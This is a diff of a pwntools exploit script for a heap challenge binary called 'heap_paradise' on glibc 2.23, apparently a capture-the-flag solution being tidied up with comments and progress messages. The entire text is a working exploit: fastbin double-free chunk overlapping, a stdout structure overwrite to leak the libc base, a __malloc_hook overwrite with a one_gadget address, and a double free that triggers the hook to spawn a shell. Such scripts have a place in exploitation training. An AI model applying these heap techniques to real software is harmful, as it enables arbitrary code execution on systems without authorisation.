@@ -24,12 +24,13 @@ binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
 leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
 leak_hex = lambda r, offset=0: int(r, 16) - offset
 leak_dec = lambda r, offset=0: int(r, 10) - offset
-pad = lambda len=1, c=b'A': c * len
-zpad = lambda len=1, c=b'\0': c * len
+pd = lambda len=1, c=b'A': c * len
+z = lambda len=1, c=b'\0': c * len
+A = pd()
 
-exe = ELF("heap_paradise_patched")
-libc = ELF("libc_64.so.6")
-ld = ELF("./ld-2.23.so")
+exe = ELF("heap_paradise_patched", checksec=False)
+libc = ELF("libc_64.so.6", checksec=False)
+ld = ELF("./ld-2.23.so", checksec=False)
 
 context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
 context.binary = exe
@@ -63,53 +64,72 @@ def alloc(size, data):
     slan(p, b'Choice', 1)
     slan(p, b'Size', size)
     sa(p, b'Data', data)
-    sleep(0.01)
 
 def free(index):
     slan(p, b'Choice', 2)
     slan(p, b'Index', index)
 
-alloc(0x40, zpad(0x38) + p64(0x51))
-alloc(0x40, zpad(0x38) + p64(0x21))
-alloc(0x60, zpad(0x18) + p64(0x51) + zpad(0x18) + p64(0x31))
+print("Setting up")
+alloc(0x40, flat(z(0x38), 0x51)) # 0
+alloc(0x40, flat(z(0x38), 0x21)) # 1
+alloc(0x60, flat(z(0x18), 0x51, z(0x18), 0x31)) # 2
 
+print("Chunk overlapping")
+# Fastbin dup
 free(0)
 free(1)
 free(0)
 
-alloc(0x40, p8(0x40))
-alloc(0x40, b'A')
-alloc(0x40, b'A')
-alloc(0x40, p64(0) + p64(0x71))
+alloc(0x40, p8(0x40)) # 3
+alloc(0x40, A) # 4
+alloc(0x40, A) # 5
+alloc(0x40, flat(0, 0x71)) # 6
 
-free(1)
+free(1) # Free to fastbins
+
 free(6)
+alloc(0x40, flat(0, 0x91))
+free(1) # Free to unsortedbins
 
-alloc(0x40, p64(0) + p64(0x91))
-free(1)
 free(6)
+alloc(0x40, flat(0, 0x71) + p16(0x45dd))
 
-alloc(0x40, p64(0) + p64(0x71) + b'\xdd\x45')
+alloc(0x60, A)
 
-alloc(0x60, b'A')
-alloc(0x60, zpad(0x33) + p64(0xfbad1800) + zpad(0x18 + 1))
+print("Leaking libc")
+# stdout overwrite to leak libc
+flags = 0xfbad1800
+alloc(0x60, flat(z(0x33), flags, z(0x18 + 1)))
 
-ru(p, p64(0xfbad1800))
+ru(p, p64(flags))
 rn(p, 0x18)
 
 libc.address = leak_bytes(rn(p, 6), 0x3c4600)
 lg("libc base", libc.address)
 
+print("Chunk overlapping")
+# Fastbin dup
 free(1)
 free(2)
 free(1)
 
-alloc(0x60, p64(libc.symbols['__malloc_hook'] - 0x23))
-alloc(0x60, b'A')
-alloc(0x60, b'A')
-alloc(0x60, zpad(0x13) + p64(libc.address + 0xef6c4))
+print("Overwriting malloc hook")
+# Overwrite malloc hook
+malloc_hook = libc.symbols['__malloc_hook']
+lg("malloc hook", malloc_hook)
+one_gadget = libc.address + 0xef6c4
+lg("one gadget", one_gadget)
 
+alloc(0x60, p64(malloc_hook - 0x23))
+alloc(0x60, A)
+alloc(0x60, A)
+alloc(0x60, flat(z(0x13), one_gadget))
+
+print("Trigger malloc printerr")
+# Malloc printerr
 free(0)
 free(0)
 
+print("Spawn shell")
+rr(p, 1)
 ia(p)
